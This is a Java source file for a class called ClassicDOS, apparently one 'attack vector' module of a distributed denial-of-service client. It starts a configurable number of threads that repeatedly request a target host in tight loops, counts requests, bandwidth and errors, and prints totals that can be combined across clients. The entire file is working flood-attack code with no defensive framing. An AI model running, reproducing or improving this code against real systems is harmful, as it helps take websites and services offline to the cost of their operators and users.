package haiku.client.vectors.instances;

import java.io.IOException;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

import haiku.client.vectors.AttackVector;

public class ClassicDOS extends AttackVector {

	private ExecutorService threads = null;
	private AtomicBoolean running;

	private LinkedHashMap<String, Integer> stats = new LinkedHashMap<>();

	@Override
	public void start(String host, int port, HashMap<String, String> options) {
		int threadCount = Integer.parseInt(options.getOrDefault("threads", "1"));
		this.running = new AtomicBoolean(true);
		this.threads = Executors.newFixedThreadPool(threadCount);
		this.resetStats();

		this.stats.put("threads", threadCount);

		for (int i = 0; i < threadCount; i++) {
			this.threads.submit(() -> {
				while (running.get()) {
					try {
						Document doc = Jsoup.connect(host).timeout(5000).get();
						this.stats.put("requests", this.stats.get("requests") + 1);
						this.stats.put("bandwidth_used", this.stats.get("bandwidth_used") + doc.html().length());
					} catch (IOException e) {
						this.stats.put("errors", this.stats.get("errors") + 1);
					}
				}
			});
		}
	}

	public void resetStats() {
		this.stats.put("requests", 0);
		this.stats.put("bandwidth_used", 0);
		this.stats.put("threads", 0);
		this.stats.put("errors", 0);
	}

	@Override
	public void stop() {
		// Mark ending
		this.running.set(false);
		
		// Wait 6 seconds for threads to finish
		try {
			this.threads.awaitTermination(6, TimeUnit.SECONDS);
		} catch (InterruptedException e) {
			this.threads.shutdownNow(); // Force closure
		}
	}

	@Override
	public HashMap<String, String> getStatistics() {
		HashMap<String, String> res = new HashMap<>();
		this.stats.forEach((c, v) -> res.put(c, v + ""));
		return res;
	}

	@SuppressWarnings("unchecked")
	@Override
	public void displayStatistics(HashMap<String, String>... hashMaps) {

		int totalRequests = 0;
		int bandwidth = 0;
		int threads = 0;
		int errors = 0;

		for (HashMap<String, String> cr : hashMaps) {
			totalRequests += Integer.parseInt(cr.getOrDefault("requests", "0"));
			bandwidth += Integer.parseInt(cr.getOrDefault("bandwidth_used", "0"));
			threads += Integer.parseInt(cr.getOrDefault("threads", "0"));
			errors += Integer.parseInt(cr.getOrDefault("errors", "0"));
		}

		System.out.println("-------------------");
		System.out.println("Total requests: " + totalRequests);
		System.out.println("Total bandwidth: " + bandwidth / 1024 + " kB");
		System.out.println("Total threads: " + threads);
		System.out.println("Total errors: " + errors);
		System.out.println("-------------------");

	}

}
